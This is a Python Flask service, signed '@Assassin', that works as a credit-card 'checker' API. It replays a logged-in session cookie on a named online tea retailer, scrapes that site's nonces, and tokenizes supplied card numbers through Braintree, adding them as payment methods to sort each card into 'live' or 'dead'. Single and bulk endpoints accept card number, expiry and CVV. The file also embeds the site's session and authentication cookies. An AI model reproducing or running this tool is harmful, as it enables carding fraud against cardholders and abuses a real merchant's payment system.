from flask import Flask, request, jsonify
import requests
import json
import time
import uuid
import random
import string
import base64
import re

app = Flask(__name__)

def generate_random_string(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def braintree_check(ccn, mm, yy, cvc):
    """Complete Braintree CC Check with proper validation"""
    
    start_time = time.time()
    
    if len(yy) == 2:
        yy = '20' + yy

    # UPDATED COOKIES WITH FRESH AUTHENTICATION
    cookies = {
        "sbjs_migrations": "1418474375998%3D1",
        "sbjs_current_add": "fd%3D2025-11-05%2009%3A47%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_first_add": "fd%3D2025-11-05%2009%3A47%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36",
        "_ga": "GA1.1.345696449.1762337869",
        "nitroCachedPage": "0",
        "mcforms-38097157-sessionId": "\"87203319-c00f-412e-8c57-fc84d7db87a5\"",
        "woocommerce_current_currency": "GBP",
        "_fbp": "fb.1.1762337871786.311092723121770164",
        "mailchimp.cart.current_email": "nipiwev288@limtu.com",
        "mailchimp.cart.previous_email": "nipiwev288@limtu.com",
        "_gcl_au": "1.1.1038064860.1762337869.1334896359.1762337897.1762337896",
        "mailchimp_user_email": "nipiwev288%40limtu.com",
        "sbjs_session": "pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%3Fpassword-reset%3Dtrue",
        "_ga_81KZY32HGV": "GS2.1.s1762337869$o1$g1$t1762337944$j48$l0$h1489784292",
        "_ga_0YYGQ7K779": "GS2.1.s1762337869$o1$g1$t1762337944$j48$l0$h187400079",
        
        # ✅ FRESH WORDPRESS AUTHENTICATION COOKIE
        "wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db": "maw04a25382C17626944742C63J7Iktsvx2EzdMhTwXGfsczM6qi1scusBMWnuLF9ZC153aef4fe17ad6218a3601358633ece76047601ab2506207b010dc01df03"
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    }

    try:
        # STEP 1: GET PAYMENT PAGE
        page_start = time.time()
        page_response = requests.get(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=headers,
            cookies=cookies,
            timeout=15
        )
        
        if page_response.status_code != 200:
            return "dead - page load failed"
            
        page_content = page_response.text
        
        # Check if response too fast (indicates failure)
        if time.time() - page_start < 2:
            return "dead - fast response"
        
        # STEP 2: EXTRACT NONCES
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
        if not nonce_match:
            return "dead - nonce not found"
        woocommerce_nonce = nonce_match.group(1)

        client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', page_content)
        if not client_nonce_match:
            return "dead - client nonce not found"
        client_nonce = client_nonce_match.group(1)

        # STEP 3: GET CLIENT TOKEN
        token_payload = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }

        token_response = requests.post(
            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies,
            data=token_payload,
            timeout=15
        )
        
        if token_response.status_code != 200:
            return "dead - token failed"
            
        token_data = token_response.json()

        if not token_data.get('success'):
            return "dead - token not successful"

        client_token_encoded = token_data.get('data')
        if not client_token_encoded:
            return "dead - no client token"

        # STEP 4: DECODE CLIENT TOKEN
        try:
            client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
            authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
            if not authorization_fingerprint:
                return "dead - no auth fingerprint"
        except:
            return "dead - token decode failed"

        # STEP 5: TOKENIZE CREDIT CARD
        session_id = str(uuid.uuid4())
        braintree_headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Braintree-Version': '2018-05-10',
            'Authorization': f'Bearer {authorization_fingerprint}'
        }

        tokenize_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": session_id,
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
        }

        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=braintree_headers,
            json=tokenize_payload,
            timeout=15
        )
        
        if tokenize_response.status_code != 200:
            return "dead - tokenize failed"

        tokenize_data = tokenize_response.json()

        if 'errors' in tokenize_data:
            return "dead - tokenize error"

        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
        if not payment_token:
            return "dead - no payment token"

        # STEP 6: ADD PAYMENT METHOD
        form_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.tea-and-coffee.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
        }

        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"

        form_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '20.78',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': woocommerce_nonce,
            '_wp_http_referer': '/account/add-payment-method-custom',
            'woocommerce_add_payment_method': '1',
        }

        payment_response = requests.post(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=form_headers,
            cookies=cookies,
            data=form_data,
            timeout=15
        )

        response_text = payment_response.text

        # FINAL VALIDATION
        if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
            total_time = time.time() - start_time
            return "live"  # ✅ PAYMENT METHOD SUCCESSFULLY ADDED
        else:
            if 'risk_threshold' in response_text or 'RISK_BIN' in response_text:
                return "dead - risk threshold"
            elif 'Insufficient funds' in response_text:
                return "dead - insufficient funds" 
            elif 'Invalid' in response_text:
                return "dead - invalid card"
            else:
                return "dead - payment failed"

    except requests.exceptions.Timeout:
        return "dead - timeout"
    except requests.exceptions.ConnectionError:
        return "dead - connection error"
    except Exception as e:
        return f"dead - system error"

# API ENDPOINTS
@app.route('/check', methods=['GET'])
def check_cc_single():
    try:
        cc_data = request.args.get('cc')
        
        if not cc_data:
            return jsonify({'error': 'Missing cc parameter'}), 400
        
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({'error': 'Invalid format. Use: cc|mm|yy|cvv'}), 400
        
        ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        status = braintree_check(ccn, mm, yy, cvv)
        
        return jsonify({
            'card': f"{ccn[:6]}******{ccn[-4:]}",
            'status': status,
            'timestamp': time.time()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/bulk', methods=['GET'])
def check_cc_bulk():
    try:
        cards_param = request.args.get('cards')
        
        if not cards_param:
            return jsonify({'error': 'Missing cards parameter'}), 400
        
        cards_list = cards_param.split(',')
        results = []
        
        for card_data in cards_list:
            parts = card_data.split('|')
            if len(parts) == 4:
                ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                status = braintree_check(ccn, mm, yy, cvv)
                
                results.append({
                    'card': f"{ccn[:6]}******{ccn[-4:]}",
                    'status': status
                })
        
        return jsonify({
            'total_cards': len(results),
            'live_cards': len([r for r in results if 'live' in r['status']]),
            'dead_cards': len([r for r in results if 'dead' in r['status']]),
            'results': results
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'Braintree CC Check API - By @Assassin', 
        'status': 'active',
        'endpoints': {
            'single_check': '/check?cc=4111111111111111|12|2026|123',
            'bulk_check': '/bulk?cards=4111111111111111|12|2026|123,5111111111111111|03|2025|456'
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
